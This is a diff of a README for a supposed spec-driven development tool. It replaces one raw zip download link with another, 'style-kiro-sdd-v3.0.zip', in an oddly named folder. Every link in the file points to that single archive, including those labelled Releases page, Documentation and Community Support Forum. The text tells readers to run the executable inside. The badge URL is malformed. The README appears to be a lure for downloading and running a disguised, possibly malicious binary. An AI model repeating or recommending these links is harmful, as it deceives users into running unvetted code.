@@ -6,13 +6,13 @@ Welcome to **Kiro Style Spec Driven Development using any LLM**. This applicatio
 
 ## 📥 Download Now
 
-[![Download Kiro Style](https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip%20Kiro%20Style%https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip)](https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip)
+[![Download Kiro Style](https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip%20Kiro%20Style%https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip)](https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip)
 
 ## 📂 Download & Install
 
 To get started, visit the Releases page to download the latest version of the application. Here is the link:
 
-[Download Kiro Style from Releases](https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip)
+[Download Kiro Style from Releases](https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip)
 
 Once you're on the Releases page, look for the latest version. You will see a list of files available for download. Choose the file that matches your operating system and click on it to start the download. 
 
@@ -35,7 +35,7 @@ After downloading the file, follow these steps to run Kiro Style:
 2. **Install the Application**
    - **Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file, drag the Kiro Style icon to your **Applications** folder, then double-click it to run.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip` file, navigate to the folder in your terminal, and run the application with the command `./kiro-style` (you may need to give execution permissions first).
+   - **Linux:** Extract the `https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip` file, navigate to the folder in your terminal, and run the application with the command `./kiro-style` (you may need to give execution permissions first).
 
 3. **Start Using Kiro Style**
    - Once installed, open the application from your applications folder or the shortcut created on your desktop. Follow the on-screen prompts to start creating your specifications effortlessly.
@@ -62,7 +62,7 @@ If you encounter any issues while downloading or running the application, please
 
 For more information, tips, and support, you can visit our community forum or documentation page linked on the Releases page. Here are some helpful links:
 
-- [Kiro Style Documentation](https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip)
-- [Community Support Forum](https://raw.githubusercontent.com/Jeancedric25/kiro-style-sdd/main/citramontane/kiro-style-sdd.zip)
+- [Kiro Style Documentation](https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip)
+- [Community Support Forum](https://github.com/Jeancedric25/kiro-style-sdd/raw/refs/heads/main/citramontane/style-kiro-sdd-v3.0.zip)
 
 Feel free to explore these resources to make the most of Kiro Style. Happy developing!
